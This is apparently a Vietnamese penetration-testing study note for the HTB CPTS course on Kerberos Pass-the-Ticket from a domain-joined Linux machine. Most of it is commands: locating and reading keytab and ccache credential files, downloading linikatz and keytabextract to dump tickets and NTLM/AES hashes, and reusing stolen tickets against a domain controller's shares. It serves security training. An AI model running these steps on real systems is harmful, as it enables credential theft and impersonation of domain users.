---
title: "Pass the Ticket - Linux"
date: 2026-04-16 10:57:50 +0700
categories: [HTB_CPTS, Post-Exploitation]
tags: [kerberos, pass-the-ticket, active-directory, linux]
description: "HTB CPTS note về Kerberos Pass the Ticket từ Linux trong môi trường AD."
pin: false
---
## Tổng quan

Linux machine join AD domain dùng Kerberos để xác thực. Nếu compromise được máy này, ta có thể lấy cắp tickets của user khác và impersonate họ.

**2 loại lưu trữ ticket trên Linux:**

|Loại|Mô tả|Vị trí mặc định|
|---|---|---|
|**ccache file**|Ticket tạm, hết hạn ~10h sau khi tạo|`/tmp/krb5cc_<UID>_<random>`|
|**keytab file**|Chứa encrypted key, dùng cho script tự động|`/etc/krb5.keytab` hoặc tùy cấu hình|

> Biến môi trường `KRB5CCNAME` trỏ đến ccache file đang dùng trong session.

---
## Attack Flow

```
1. Xác nhận máy join domain
2. Tìm ticket (thủ công hoặc Linikatz)
3. Dùng ticket tùy loại file tìm được
   ├── keytab → kinit hoặc extract hash
   └── ccache → export KRB5CCNAME
```

---
## Bước 1 — Xác nhận máy join domain

```bash
realm list

# Hoặc kiểm tra service đang chạy
ps -ef | grep -i "winbind\|sssd"
```

---
## Bước 2 — Tìm ticket

### Cách 1: Tìm thủ công

**Tìm keytab files:**

```bash
# Tìm theo tên file — kể cả extension lạ như .kt
find / -name *keytab* -ls 2>/dev/null
find / -name *.kt -ls 2>/dev/null

# Tìm trong cronjob — script có thể hardcode đường dẫn keytab
crontab -l
cat /path/to/script.sh   # tìm lệnh kinit bên trong

# Kiểm tra kỹ thư mục scripts của từng user
ls -la /home/<user>@<domain>/.scripts/
```

> Admin đôi khi tạo 2 file keytab: `file.kt` (chỉ AES) và `file._all.kt` (đầy đủ RC4+AES). File `_all.kt` mới có NTLM hash để crack.

**Tìm ccache files:**

```bash
# Xem KRB5CCNAME session hiện tại
env | grep -i krb5

# Liệt kê tất cả ccache files trong /tmp
ls -la /tmp

# SSSD lưu ticket của computer account tại đây (cần root)
ls -la /var/lib/sss/db/ccache_<DOMAIN>
```

### Cách 2: Linikatz (dump tất cả cùng lúc, cần root)

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
./linikatz.sh
```

Dump toàn bộ ccache files, keytab files, hashes từ SSSD, Samba, FreeIPA... Sau khi dump xong vẫn phải dùng ticket theo bước 3.

---
## Bước 3 — Dùng ticket

### Với keytab file

> Cần quyền **read** trên keytab file. Nếu không có → leo quyền trước hoặc tìm file bị set sai permission (`-rw-rw-rw-`).

**Cách A — Impersonate user bằng kinit:**

```bash
# Xem keytab thuộc về user nào
klist -k -t /path/to/<user>.keytab

# Import ticket vào session hiện tại
kinit <user>@<DOMAIN> -k -t /path/to/<user>.keytab

# Xác nhận rồi dùng
klist
smbclient //<dc_hostname>/<share> -k -c ls
```

> `kinit` case-sensitive — dùng đúng tên principal như hiển thị trong `klist`.

**Cách B — Extract hash → crack password:**

```bash
# Download keytabextract
wget https://raw.githubusercontent.com/sosdave/KeyTabExtract/master/keytabextract.py

# Chạy
python3 keytabextract.py /path/to/<user>.keytab
```

Output:

```
NTLM HASH  : <hash>
AES-256 HASH : <hash>
AES-128 HASH : <hash>
```

- **NTLM hash** → Pass-the-Hash hoặc crack bằng Hashcat / John / crackstation.net
- **AES-256 only, không có NTLM** → kinit vẫn dùng được nhưng không crack password được. Tìm file `_all.kt` thay thế.

Sau khi có password → `su - <user>@<domain>` để login thẳng vào máy.

### Với ccache file (cần root)

```bash
# Kiểm tra user có giá trị không
id <user>@<domain>   # tìm Domain Admin

# Check ticket còn hạn không trước khi dùng
klist -c /tmp/krb5cc_<UID>_<random>

# Nếu hết hạn → chờ user login lại
watch -n 5 'ls -la /tmp | grep <username>'

# Copy và set biến môi trường
cp /tmp/krb5cc_<UID>_<random> .
export KRB5CCNAME=/root/krb5cc_<UID>_<random>

# Xác nhận ticket còn hạn
klist

# Dùng ticket tấn công DC
smbclient //<dc_hostname>/C$ -k -c ls -no-pass
```

> Kiểm tra trường `Expires` trong `klist` — nếu đã quá hạn thì ticket vô dụng. ccache file tạm thời, có thể bị xóa bất cứ lúc nào khi user logout.

### Với computer account ticket (SSSD, cần root)

```bash
# SSSD lưu ticket của computer account (LINUX01$) tại đây
cp /var/lib/sss/db/ccache_<DOMAIN> .
export KRB5CCNAME=/root/ccache_<DOMAIN>

# Xác nhận — thấy LINUX01$@DOMAIN
klist

# Dùng ticket truy cập share của computer account
smbclient //<dc_hostname>/linux01 -k -no-pass -c ls
```

---
## Convert ticket giữa Linux ↔ Windows

```bash
# Linux ccache → Windows kirbi
impacket-ticketConverter krb5cc_<UID>_<random> <user>.kirbi

# Windows kirbi → import vào session Windows
Rubeus.exe ptt /ticket:c:\path\to\<user>.kirbi
```

---
## Quick Reference

|Lệnh|Mục đích|
|---|---|
|`klist`|Xem ticket đang dùng trong session|
|`klist -c /tmp/<file>`|Check ticket cụ thể còn hạn không|
|`klist -k -t <file>.keytab`|Xem thông tin keytab file|
|`kinit <user>@<DOMAIN>`|Request TGT bằng password|
|`kinit <user>@<DOMAIN> -k -t <file>.keytab`|Import ticket từ keytab|
|`kdestroy`|Xóa tất cả tickets|
|`export KRB5CCNAME=/path/to/ccache`|Chỉ định ccache file cần dùng|

---
